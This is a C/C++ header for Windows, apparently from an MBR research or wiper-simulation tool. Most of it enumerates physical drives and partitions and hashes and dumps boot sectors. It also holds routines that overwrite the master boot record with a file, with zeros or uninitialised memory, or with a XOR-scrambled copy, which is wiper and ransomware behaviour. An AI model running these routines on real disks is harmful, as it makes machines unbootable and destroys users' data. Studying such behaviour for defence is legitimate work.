#pragma once
#pragma once
#include "stdafx.h"
#include "Helper.h"


LPVOID lpBuffer;


void ReadDumpBootSector(LPCTSTR lpszFileName,int iNumOFBytesToRead, HANDLE hConsole, WORD wOriginalAttributes, int iForeground, LPCTSTR DumpBinFileName, BOOL bHashFlag)
{
	
	wchar_t wcHashValue[41] = { 0 };

	lpBuffer = ReadIO(lpszFileName, iNumOFBytesToRead, hConsole, wOriginalAttributes);
	ComputeHash(lpBuffer, iNumOFBytesToRead, wcHashValue, hConsole, wOriginalAttributes);
	MemHexDump(lpBuffer, iNumOFBytesToRead, hConsole, wOriginalAttributes, iForeground);
	WriteToAFile(lpBuffer, iNumOFBytesToRead, wcHashValue, hConsole, wOriginalAttributes, DumpBinFileName, bHashFlag);
}

void OverWriteMBRCode(LPCTSTR lpszFileName, int iNumOFBytesToRead, HANDLE hConsole, WORD wOriginalAttributes, LPCTSTR BootFileName)
{


	lpBuffer = ReadIO(lpszFileName, iNumOFBytesToRead, hConsole, wOriginalAttributes);
	OverWriteStream(iNumOFBytesToRead, hConsole, wOriginalAttributes, lpBuffer, BootFileName);
}

void MBROverWriteWithUnInitializedBufferOrZero(DWORD CodeSize, HANDLE hConsole, WORD wOriginalAttributes, bool bSimFlag, LPCTSTR BootFileName)
{
	lpBuffer = malloc(CodeSize);
	if (lpBuffer == NULL)
	{
		
		ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
		ExitProcess(1);
	}
	if (bSimFlag)
	{
		memset(lpBuffer, 0, CodeSize);
	}
	OverWriteStream(CodeSize, hConsole, wOriginalAttributes, lpBuffer, BootFileName);
}

void XorEncrypMBR(int iNumOFBytesToRead, HANDLE hConsole, WORD wOriginalAttributes, LPCTSTR BootFileName)
{
	size_t i;

	lpBuffer = ReadIO(BootFileName, iNumOFBytesToRead, hConsole, wOriginalAttributes);
	for (i = 0; i < iNumOFBytesToRead; i++)
	{
		((unsigned char*)lpBuffer)[i] = ((unsigned char*)lpBuffer)[i] ^ 7;
		//printf("%02X", ((unsigned char*)lpBuffer)[i]);
	}
	OverWriteStream(iNumOFBytesToRead, hConsole, wOriginalAttributes, lpBuffer, BootFileName);
}

void EnumerateVolumePartion(WORD CodeSize, HANDLE hConsole, WORD wOriginalAttributes, int iForeground)
{
	int i;
	LPDWORD BytesReturned = 0;
	TCHAR lpszPhysicalDrivePath[512] = { 0 };
	const int MAX_NUMBER_OF_DRIVES = 64;
	
	

	_STORAGE_DEVICE_NUMBER STORAGE_DEVICE_NUMBER;

	for (i = 0; i < MAX_NUMBER_OF_DRIVES; i++)
	{
		HANDLE fh = 0;
		wnsprintfW(lpszPhysicalDrivePath, 0x200, L"\\\\.\\PhysicalDrive%u", i);
		printf("[+] STATUS: [MSG] --> Enumerating Physical Device: %ws\n", lpszPhysicalDrivePath);
		if ((fh = CreateFile(lpszPhysicalDrivePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0)) == INVALID_HANDLE_VALUE)
		{
			
			//ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
			continue;
		}
		
		SuccessMsg(TEXT("in opening a handle of PhysicalDevice.\n"), hConsole, wOriginalAttributes);

		if (!DeviceIoControl(fh, IOCTL_STORAGE_GET_DEVICE_NUMBER, 0, 0, &STORAGE_DEVICE_NUMBER, 0xCu, BytesReturned, 0))
		{
			ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
			CloseHandleAndExit(fh);
		}
		SuccessMsg(TEXT("in getting IOCTL_STORAGE_GET_DEVICE_NUMBER.\n"), hConsole, wOriginalAttributes);
		printf("[+] STATUS: [SUCCESS] --> DeviceType:0x%02x\n", STORAGE_DEVICE_NUMBER.DeviceType);

		if (STORAGE_DEVICE_NUMBER.DeviceType != FILE_DEVICE_DISK)
		{
			ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
			CloseHandleAndExit(fh);
		}

		_DISK_GEOMETRY_EX DISK_GEOMETRY_EX;
		if (!DeviceIoControl(fh, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, 0, 0, &DISK_GEOMETRY_EX, 0x28u, BytesReturned, 0)
			|| DISK_GEOMETRY_EX.Geometry.MediaType != RemovableMedia && DISK_GEOMETRY_EX.Geometry.MediaType != FixedMedia)
		{
			ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
			CloseHandleAndExit(fh);
		}
		SuccessMsg(TEXT("in getting IOCTL_DISK_GET_DRIVE_GEOMETRY_EX .\n"), hConsole, wOriginalAttributes);

		printf("[+] STATUS: [SUCCESS] --> Disk_GEO Cylinders.LowPart  : 0x%08x\n", DISK_GEOMETRY_EX.Geometry.Cylinders.LowPart);
		printf("[+] STATUS: [SUCCESS] --> Disk_GEO Cylinders.HighPart : 0x%08x\n", DISK_GEOMETRY_EX.Geometry.Cylinders.HighPart);
		printf("[+] STATUS: [SUCCESS] --> Disk_GEO MediaType          : 0x%08x\n", DISK_GEOMETRY_EX.Geometry.MediaType);
		printf("[+] STATUS: [SUCCESS] --> Disk_GEO TracksPerCylinder  : 0x%08x\n", DISK_GEOMETRY_EX.Geometry.TracksPerCylinder);
		printf("[+] STATUS: [SUCCESS] --> Disk_GEO SectorsPerTrack    : 0x%08x\n", DISK_GEOMETRY_EX.Geometry.SectorsPerTrack);
		printf("[+] STATUS: [SUCCESS] --> Disk_GEO BytesPerSector     : 0x%08x\n", DISK_GEOMETRY_EX.Geometry.BytesPerSector);
		printf("[+] STATUS: [SUCCESS] --> Disk_GEO DiskSize           : 0x%08x%08x\n", DISK_GEOMETRY_EX.DiskSize.HighPart, DISK_GEOMETRY_EX.DiskSize.LowPart);

		
		
		HANDLE hhp = 0;
		_DRIVE_LAYOUT_INFORMATION_EX *DRIVE_LAYOUT_INFORMATION_EX;

		hhp = GetProcessHeap();
		DRIVE_LAYOUT_INFORMATION_EX = (_DRIVE_LAYOUT_INFORMATION_EX*)HeapAlloc(hhp, 8u, 0x24C0u);
		
		if (!DeviceIoControl(
			fh,
			IOCTL_DISK_GET_DRIVE_LAYOUT_EX,
			0,
			0,
			DRIVE_LAYOUT_INFORMATION_EX,
			0x24C0u,
			BytesReturned,
			0))
		{
			ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
			CloseHandleAndExit(fh);

		}
		SuccessMsg(TEXT("in getting IOCTL_DISK_GET_DRIVE_LAYOUT_EX.\n"), hConsole, wOriginalAttributes);
		
		printf("[+] STATUS: [MSG]      --> Partition Enumeration...\n");

		printf("+ ----------------------------------------------------------------------------\n\n");
		if (DRIVE_LAYOUT_INFORMATION_EX)
		{
			DWORD dwPartitionStyle = 0;
			dwPartitionStyle = DRIVE_LAYOUT_INFORMATION_EX->PartitionStyle;
			printf("[+] STATUS: [SUCCESS] --> Drive Layout PartitionStyle : %d\n", dwPartitionStyle);

			if (dwPartitionStyle == PARTITION_STYLE_RAW || !dwPartitionStyle || dwPartitionStyle == PARTITION_STYLE_GPT)
			{
				printf("[+] STATUS: [SUCCESS] --> PartitionCount: 0x%08x\n", DRIVE_LAYOUT_INFORMATION_EX->PartitionCount);
				
				
				_PARTITION_INFORMATION_EX* piePartInfo = DRIVE_LAYOUT_INFORMATION_EX->PartitionEntry;
				_PARTITION_INFORMATION_EX* piePartInfo2 = DRIVE_LAYOUT_INFORMATION_EX->PartitionEntry;

				int j;
				for (j = 0; j < DRIVE_LAYOUT_INFORMATION_EX->PartitionCount; j++)
				{
					printf("[+] STATUS: [SUCCESS] --> PartitionNumber: 0x%08x\n", piePartInfo->PartitionNumber);
					
					DWORD dwBytesPerSector = DISK_GEOMETRY_EX.Geometry.BytesPerSector;


					if (piePartInfo->PartitionStyle == PARTITION_STYLE_MBR)
					{
						SuccessMsg(TEXT("MBR Partition Found ...\n"), hConsole, wOriginalAttributes);
						printf("[+] STATUS: [SUCCESS] --> MBR Partition Type       : 0x%08x\n", piePartInfo->Mbr.PartitionType);
						printf("[+] STATUS: [SUCCESS] --> MBR BootIndicatior       : 0x%08x\n", piePartInfo->Mbr.BootIndicator);
						printf("[+] STATUS: [SUCCESS] --> MBR RecognizedPartition  : 0x%08x\n", piePartInfo->Mbr.RecognizedPartition);
						printf("[+] STATUS: [SUCCESS] --> MBR PartitionId: {%08lX-%04hX-%04hX-%02hhX%02hhX-%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX}\n", piePartInfo->Mbr.PartitionId.Data1, piePartInfo->Mbr.PartitionId.Data2, piePartInfo->Mbr.PartitionId.Data3,
							piePartInfo->Mbr.PartitionId.Data4[0], piePartInfo->Mbr.PartitionId.Data4[1], piePartInfo->Mbr.PartitionId.Data4[2], piePartInfo->Mbr.PartitionId.Data4[3],
							piePartInfo->Mbr.PartitionId.Data4[4], piePartInfo->Mbr.PartitionId.Data4[5], piePartInfo->Mbr.PartitionId.Data4[6], piePartInfo->Mbr.PartitionId.Data4[7]);
					}
					else if (piePartInfo->PartitionStyle == PARTITION_STYLE_GPT)
					{
						SuccessMsg(TEXT("GPT Partition Found ...\n"), hConsole, wOriginalAttributes);

						printf("[+] STATUS: [SUCCESS] --> GPT DiskID        : {%08lX-%04hX-%04hX-%02hhX%02hhX-%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX}\n", DRIVE_LAYOUT_INFORMATION_EX->Gpt.DiskId.Data1, DRIVE_LAYOUT_INFORMATION_EX->Gpt.DiskId.Data2, DRIVE_LAYOUT_INFORMATION_EX->Gpt.DiskId.Data3,
							DRIVE_LAYOUT_INFORMATION_EX->Gpt.DiskId.Data4[0], DRIVE_LAYOUT_INFORMATION_EX->Gpt.DiskId.Data4[1], DRIVE_LAYOUT_INFORMATION_EX->Gpt.DiskId.Data4[2], DRIVE_LAYOUT_INFORMATION_EX->Gpt.DiskId.Data4[3],
							DRIVE_LAYOUT_INFORMATION_EX->Gpt.DiskId.Data4[4], DRIVE_LAYOUT_INFORMATION_EX->Gpt.DiskId.Data4[5], DRIVE_LAYOUT_INFORMATION_EX->Gpt.DiskId.Data4[6], DRIVE_LAYOUT_INFORMATION_EX->Gpt.DiskId.Data4[7]);

						printf("[+] STATUS: [SUCCESS] --> GPT PartitionId   : {%08lX-%04hX-%04hX-%02hhX%02hhX-%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX}\n", piePartInfo->Gpt.PartitionId.Data1, piePartInfo->Gpt.PartitionId.Data2, piePartInfo->Gpt.PartitionId.Data3,
							piePartInfo->Gpt.PartitionId.Data4[0], piePartInfo->Gpt.PartitionId.Data4[1], piePartInfo->Gpt.PartitionId.Data4[2], piePartInfo->Gpt.PartitionId.Data4[3],
							piePartInfo->Gpt.PartitionId.Data4[4], piePartInfo->Gpt.PartitionId.Data4[5], piePartInfo->Gpt.PartitionId.Data4[6], piePartInfo->Gpt.PartitionId.Data4[7]);

						printf("[+] STATUS: [SUCCESS] --> GPT PartitionType : {%08lX-%04hX-%04hX-%02hhX%02hhX-%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX}\n", piePartInfo->Gpt.PartitionType.Data1, piePartInfo->Gpt.PartitionType.Data2, piePartInfo->Gpt.PartitionType.Data3,
							piePartInfo->Gpt.PartitionType.Data4[0], piePartInfo->Gpt.PartitionType.Data4[1], piePartInfo->Gpt.PartitionType.Data4[2], piePartInfo->Gpt.PartitionType.Data4[3],
							piePartInfo->Gpt.PartitionType.Data4[4], piePartInfo->Gpt.PartitionType.Data4[5], piePartInfo->Gpt.PartitionType.Data4[6], piePartInfo->Gpt.PartitionType.Data4[7]);

						printf("[+] STATUS: [SUCCESS] --> GPT Attribute     : 0x%" PRIx64 "\n", piePartInfo->Gpt.Attributes);
						printf("[+] STATUS: [SUCCESS] --> GPT Name          : %ws\n", piePartInfo->Gpt.Name);
					}
					else if (piePartInfo->PartitionStyle != PARTITION_STYLE_GPT)
					{
						printf("[+] STATUS: [MSG] --> not a GPT or MBR Partition Style. It is %d", piePartInfo->PartitionStyle);
						continue;
					}

					DWORD dwNumberOfBytesRead = 0;
					HANDLE hProcHeap = GetProcessHeap();
					LPVOID lphBuffer = HeapAlloc(hProcHeap, 0, dwBytesPerSector);
					printf("[+] STATUS: [SUCCESS] --> Partition Entry Starting Offset: 0x%08x%08x\n", piePartInfo->StartingOffset.HighPart, piePartInfo->StartingOffset.LowPart);
					if (!lphBuffer
						|| !SetFilePointerEx(fh, piePartInfo->StartingOffset, 0, 0)
						|| !ReadFile(fh, lphBuffer, DISK_GEOMETRY_EX.Geometry.BytesPerSector, &dwNumberOfBytesRead, 0))
					{
						ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
						CloseHandleAndExit(fh);
					}
					wchar_t wcHashValue[41] = { 0 };
					ComputeHash(lphBuffer, DISK_GEOMETRY_EX.Geometry.BytesPerSector, wcHashValue, hConsole, wOriginalAttributes);
					MemHexDump(lphBuffer, DISK_GEOMETRY_EX.Geometry.BytesPerSector, hConsole, wOriginalAttributes, iForeground);
					piePartInfo = piePartInfo2 + 1;
					piePartInfo2++;
					HANDLE hp = GetProcessHeap();
					HeapFree(hp, 0, lphBuffer);
				}

			
			}

		}

		CloseHandle(fh);
	}
}


